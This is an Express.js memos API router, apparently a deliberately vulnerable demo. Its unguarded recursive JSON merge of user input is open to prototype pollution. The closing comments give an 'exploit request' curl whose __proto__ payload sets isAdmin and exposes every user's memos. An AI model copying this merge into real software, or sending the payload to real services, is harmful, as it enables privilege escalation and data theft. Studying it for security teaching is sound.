import express from "express";
import { db } from "../lib/db.js";

export const memosRouter = express.Router();

memosRouter.get("/memos", (req, res) => {
  if (!res.locals.user) {
    return res.status(401).send("Unauthorized");
  }

  let memosList = [];
  if (res.locals.user.isAdmin) {
    // get memos for all users:
    memosList = db
      .prepare(
        `SELECT memos.id, memos.text, memos.meta, memos.date, user_profile.full_name, user_profile.user_id
         FROM memos
         JOIN user_profile ON memos.user_id = user_profile.user_id`
      )
      .all();
  } else {
    memosList = db
      .prepare(
        `SELECT memos.id, memos.text, memos.meta, memos.date, user_profile.full_name, user_profile.user_id FROM memos JOIN 
            user_profile ON memos.user_id = user_profile.user_id WHERE memos.user_id = ?`
      )
      .all(res.locals.user.id);
  }

  return res.status(200).json({
    success: true,
    memos: memosList,
  });
});

memosRouter.post("/memos", (req, res) => {
  if (!res.locals.user) {
    return res.status(401).send("Unauthorized");
  }

  const text = req.body.text;
  const meta = req.body.meta || "{}";

  if (!text) {
    return res.status(400).json({
      success: false,
      error: "Text is required",
    });
  }

  const baseContactInformation = db
    .prepare(
      `SELECT user_profile.email, user_profile.address, user_profile.phone_number FROM user_profile WHERE user_profile.user_id = ?`
    )
    .get(res.locals.user.id);
  const contactInMemo = JSON.parse(meta);
  const userExtendedMeta = recursiveJSONMerge(
    baseContactInformation,
    contactInMemo
  );

  const date = new Date().toISOString();
  db.prepare(
    "INSERT INTO memos (user_id, text, meta, date) VALUES (?, ?, ?, ?)"
  ).run(res.locals.user.id, text, JSON.stringify(userExtendedMeta), date);

  return res.status(200).json({
    success: true,
  });
});

function recursiveJSONMerge(target, source) {
  for (const key in source) {
    if (source[key] instanceof Object) {
      target[key] = recursiveJSONMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// ## ok request
// curl 'http://localhost:3000/api/memos' \
//   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8' \
//   -H 'Connection: keep-alive' \
//   -H 'Cookie: auth_session=lkf5ewcyzhvkwyjmujaxsvtcsocnonco2o5ztdx5' \
//   -H 'Origin: http://localhost:3000' \
//   -H 'Referer: http://localhost:3000/memos' \
//   -H 'Sec-Fetch-Dest: empty' \
//   -H 'Sec-Fetch-Mode: cors' \
//   -H 'Sec-Fetch-Site: same-origin' \
//   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
//   -H 'accept: application/json' \
//   -H 'content-type: application/json' \
//   -H 'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"' \
//   -H 'sec-ch-ua-mobile: ?0' \
//   -H 'sec-ch-ua-platform: "macOS"' \
//   --data-raw '{"text":"ok ok ok ","meta":"{\"phone\":\"1234\",\"urgency\":\"high\"}"}'

// ## exploit request
// curl 'http://localhost:3000/api/memos' \
//   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8' \
//   -H 'Connection: keep-alive' \
//   -H 'Cookie: auth_session=lkf5ewcyzhvkwyjmujaxsvtcsocnonco2o5ztdx5' \
//   -H 'Origin: http://localhost:3000' \
//   -H 'Referer: http://localhost:3000/memos' \
//   -H 'Sec-Fetch-Dest: empty' \
//   -H 'Sec-Fetch-Mode: cors' \
//   -H 'Sec-Fetch-Site: same-origin' \
//   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
//   -H 'accept: application/json' \
//   -H 'content-type: application/json' \
//   -H 'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"' \
//   -H 'sec-ch-ua-mobile: ?0' \
//   -H 'sec-ch-ua-platform: "macOS"' \
//   --data-raw '{"text":"ok ok ok ","meta":"{\"__proto__\": {\"isAdmin\": 1}, \"phone\":\"1234\",\"urgency\":\"high\"}"}'
